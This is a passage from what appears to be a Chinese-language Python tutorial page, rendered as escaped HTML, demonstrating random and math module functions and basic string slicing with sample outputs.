&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;randrange(100) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;randrange&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# randrange(100) :  11&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 第一个随机数&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;random() : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# random() :  0.7601111373084349&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 第二个随机数&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;random() : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;random&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# random() :  0.9598748666088929&lt;/span&gt;
list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;shuffle&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;随机排序列表 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 随机排序列表 :  [10, 5, 20, 16]&lt;/span&gt;
random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;shuffle&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;随机排序列表 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
随机排序列表 &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;uniform(5, 10) 的随机浮点数 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;uniform&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# uniform(5, 10) 的随机浮点数 :  9.959955410049714&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;uniform(7, 14) 的随机浮点数 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; random&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;uniform&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# uniform(7, 14) 的随机浮点数 :  11.843622946237328&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;acos(1) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;acos&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# acos(1) :  0.0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;asin(1) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;asin&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# asin(1) :  1.5707963267948966&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;atan(1) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;atan&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# atan(1) :  0.7853981633974483&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;atan2(10,20) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;atan2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# atan2(10,20) :  0.4636476090008061&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;cos(2*math.pi) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;cos&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# cos(2*math.pi) :  1.0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;hypot(0, 2) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;hypot&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# hypot(0, 2) :  2.0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;sin(math.pi/2) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sin&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pi &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# sin(math.pi/2) :  1.0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;tan(math.pi/4) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tan&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pi &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# tan(math.pi/4) :  0.9999999999999999&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;degrees(math.pi/4) : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;degrees&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pi &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# degrees(math.pi/4) :  45.0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;radians&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;180&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1.0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 3.141592653589793&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;math&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 2.718281828459045&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
abs(-40) :  40
math.ceil(-45.17) :  -45
1
math.exp(-45.17) :  2.4150062132629406e-20
math.fabs(-45.17) :  45.17
math.floor(-45.17) :  -46
math.log(100.12) :  4.6063694665635735
math.log10(100.12) :  2.0005208409361854
max(80, 100, 1000) :  1000
min(80, 100, 1000) :  80
math.modf(100.12) :  (0.12000000000000455, 100.0)
math.pow(100, 2) :  10000.0
pow(100, 2) :  10000
round(-100.000056, 3) :  -100.0
math.sqrt(100) :  10.0
从 range(100) 返回一个随机数 :  22
从列表中 [1, 2, 3, 5, 9]) 返回一个随机元素 :  2
从字符串中 &#39;Runoob&#39; 返回一个随机字符 :  R
randrange(1,100, 2) :  83
randrange(100) :  92
random() :  0.2392758950765237
random() :  0.7016096413249141
随机排序列表 :  [16, 5, 20, 10]
随机排序列表 :  [20, 16, 10, 5]
uniform(5, 10) 的随机浮点数 :  9.96850739092334
uniform(7, 14) 的随机浮点数 :  9.03188249118426
acos(1) :  0.0
asin(1) :  1.5707963267948966
atan(1) :  0.7853981633974483
atan2(10,20) :  0.4636476090008061
cos(2*math.pi) :  1.0
hypot(0, 2) :  2.0
sin(math.pi/2) :  1.0
tan(math.pi/4) :  0.9999999999999999
degrees(math.pi/4) :  45.0
1.0
3.141592653589793
2.718281828459045
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;字符串-String&#34;&gt;&lt;a href=&#34;#字符串-String&#34; class=&#34;headerlink&#34; title=&#34;字符串(String)&#34;&gt;&lt;/a&gt;字符串(String)&lt;/h2&gt;&lt;h3 id=&#34;字符串截取格式-1&#34;&gt;&lt;a href=&#34;#字符串截取格式-1&#34; class=&#34;headerlink&#34; title=&#34;字符串截取格式&#34;&gt;&lt;/a&gt;字符串截取格式&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;变量名&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;头下标&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;尾下标&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从前面索引  0 1 2 3 4 ……&lt;/p&gt;
&lt;p&gt;从后面索引  -1 -2 -3 -4 -5 ……&lt;/p&gt;
&lt;p&gt;从前面截取 :1 2 3 4:&lt;/p&gt;
&lt;p&gt;从后面截取 :-4 -3 -2 -1:&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 创建字符串&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# t&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有字符&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出第一个到倒数第二个&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# tes&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出第三个到第四个&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# st&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# testtest&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;re&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# testre&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# t t&lt;/span&gt;
